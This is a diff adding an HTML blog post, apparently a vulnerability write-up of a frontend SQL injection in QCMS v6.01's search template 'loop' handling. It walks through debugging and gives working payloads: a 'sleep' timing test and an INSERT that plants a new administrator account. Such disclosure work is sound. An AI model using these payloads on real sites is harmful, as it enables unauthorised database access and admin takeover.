@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="QCMS_v6.01">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QCMS_v6.01_EN">
+<meta property="og:url" content="https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/index.html">
+<meta property="og:site_name" content="清风的博客">
+<meta property="og:description" content="QCMS_v6.01">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517190623-q2emtja.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517190856-2j3xino.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517191025-pj8v8sn.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517191503-o34dp04.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517191653-e4onphr.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517192004-ufhk7j5.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20231003192019-t5dzdb0.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20231003192337-ytm3jqx.png">
+<meta property="og:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20231003192326-zl735j8.png">
+<meta property="article:published_time" content="2023-10-03T11:35:39.000Z">
+<meta property="article:modified_time" content="2024-03-09T11:39:38.623Z">
+<meta property="article:author" content="清风">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qingfeng.tech/Blogimages/QCMS_v6.01/image-20230517190623-q2emtja.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>QCMS_v6.01_EN</title><meta name="robots" content="noindex">
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&text=QCMS_v6.01_EN"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&is_video=false&description=QCMS_v6.01_EN"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=QCMS_v6.01_EN&body=Check out this article: https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&name=QCMS_v6.01_EN&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&t=QCMS_v6.01_EN"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QCMS-v6-01"><span class="toc-number">1.</span> <span class="toc-text">QCMS_v6.01</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Frontend-SQL-Injection"><span class="toc-number">1.1.</span> <span class="toc-text">Frontend SQL Injection</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        QCMS_v6.01_EN
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">清风</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-03T11:35:39.000Z" class="dt-published" itemprop="datePublished">2023-10-03</time>
+        
+        (Updated: <time datetime="2024-03-09T11:39:38.623Z" class="dt-updated" itemprop="dateModified">2024-03-09</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="QCMS-v6-01"><a href="#QCMS-v6-01" class="headerlink" title="QCMS_v6.01"></a>QCMS_v6.01</h1><p>Source code:</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.q-cms.cn/detail/8.html">QCMS V6.0.1 Official Release - QCMS Official Forum (q-cms.cn)</a></p>
+<h2 id="Frontend-SQL-Injection"><a href="#Frontend-SQL-Injection" class="headerlink" title="Frontend SQL Injection"></a>Frontend SQL Injection</h2><p>Procedure:</p>
+<p>Enter ‘1’ into the input box to initiate source code debugging:</p>
+<p>Route: <strong>System&#x2F;Controller&#x2F;index.php</strong></p>
+<p>Set breakpoint at the ‘search’ location:</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517190623-q2emtja.png" alt="image"></p>
+<p>Then follow the debugging process, and eventually find the SQL injection point in the ‘loop’:</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517190856-2j3xino.png" alt="image"></p>
+<p>There is a regular expression to pass:</p>
+<pre class=" language-xml"><code class="language-xml">/{{loop([\s\S.]*?)}}([\s\S.]*?){{\/loop}}/i
+</code></pre>
+<p>Matching is straightforward:</p>
+<pre class=" language-xml"><code class="language-xml">{{loop}}a{{/loop}}
+</code></pre>
+<p>And what needs to be matched here is $Matches[1]</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517191025-pj8v8sn.png" alt="image"></p>
+<p>So you need to control</p>
+<pre class=" language-xml"><code class="language-xml">{{loop(controlled)}}a{{/loop}}
+</code></pre>
+<p>And there’s another line $Para[‘sql’], so the controlled area is</p>
+<pre class=" language-xml"><code class="language-xml">{{loopsql}}a{{/loop}}
+</code></pre>
+<p>Enter <code>self::_getKv($v)</code></p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517191503-o34dp04.png" alt="image"></p>
+<p>Discover another regular expression</p>
+<pre class=" language-xml"><code class="language-xml">/([\w]*?)=\'([\w\W]*?)\'/i
+</code></pre>
+<p>The format here is like sql&#x3D;’xxx’</p>
+<p>We pass parameters</p>
+<pre class=" language-xml"><code class="language-xml">{{loopsql=''xxx}}a{{/loop}}
+</code></pre>
+<p>This way sql&#x3D;’xxx’ is returned</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517191653-e4onphr.png" alt="image"></p>
+<p>Follow through from <code>$Replace[] = self::_replaceLoop($Para[&#39;sql&#39;], $Matches[2][$k], &#39;Loop_&#39;);</code></p>
+<pre class=" language-xml"><code class="language-xml">Db.php:66, Model\QC_Sys_model->query()
+Controllers.php:760, Index->_replaceLoop()
+Controllers.php:660, Index->loop_Tmp()
+Controllers.php:57, Index->tempRun()
+index.php:32, Index->search_Action()
+Base.php:236, Base::InsertFuncArray()
+Router.php:97, Router->ViewController()
+Router.php:22, Router->__construct()
+Router.php:25, Router::get_instance()
+X.php:27, require()
+index.php:29, {main}()
+</code></pre>
+<p><img src="/Blogimages/QCMS_v6.01/image-20230517192004-ufhk7j5.png" alt="image"></p>
+<p>It directly executes what is passed in, leading to SQL injection</p>
+<pre class=" language-xml"><code class="language-xml">{{loopsql='select sleep(1)'}}{{/loop}}
+</code></pre>
+<p>Proof of harm:</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20231003192019-t5dzdb0.png" alt="image"></p>
+<p>Enter a time-delayed query statement, and find a delay of 7s here because</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$Para</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_getKv</span><span class="token punctuation">(</span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token punctuation">;</span> 
+    <span class="token variable">$Search</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token variable">$Replace</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">_replaceLoop</span><span class="token punctuation">(</span><span class="token variable">$Para</span><span class="token punctuation">[</span><span class="token string">'sql'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Matches</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$k</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'Loop_'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>This line will cause sleep to execute multiple times, resulting in a seven-second delay</p>
+<p>If we change the sleep time to 2:</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20231003192337-ytm3jqx.png" alt="image"></p>
+<p>And we can also see sleep(2) executed 7 times in the SQL execution log</p>
+<p><img src="/Blogimages/QCMS_v6.01/image-20231003192326-zl735j8.png" alt="image"></p>
+<p>This way we can change the database password:</p>
+<pre class=" language-xml"><code class="language-xml">{{loopsql='INSERT INTO qc_user (UserId, Phone, NickName, Head, Password, Name, Address, Sex, Mail, MailCheck, Money, Coins, State, TsAdd, IpAdd, GroupUserId, GroupAdminId, IsAdmin, TsLast, IpLast) VALUES (999, "18898765432", "Administrator", "", "e10adc3949ba59abbe56e057f20f883e", "", "", 1, "", 2, 0.00, 0, 1, 1684310395, "127.0.0.1", 1, 1, 1, 1684310876, "127.0.0.1");'}}a{{/loop}}
+</code></pre>
+<!-- flag of hidden posts -->
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QCMS-v6-01"><span class="toc-number">1.</span> <span class="toc-text">QCMS_v6.01</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Frontend-SQL-Injection"><span class="toc-number">1.1.</span> <span class="toc-text">Frontend SQL Injection</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&text=QCMS_v6.01_EN"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&is_video=false&description=QCMS_v6.01_EN"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=QCMS_v6.01_EN&body=Check out this article: https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&title=QCMS_v6.01_EN"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&name=QCMS_v6.01_EN&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/10/03/Qcmsv6.01_EN/&t=QCMS_v6.01_EN"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2024
+    清风
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">首页</a></li><!--
+    --><!--
+      --><li><a href="/about/">关于</a></li><!--
+    --><!--
+      --><li><a href="/archives/">归档</a></li><!--
+    --><!--
+      --><li><a href="/categories/">分类</a></li><!--
+    --><!--
+      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'qing3feng/qingfengComments';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+</body>
+</html>
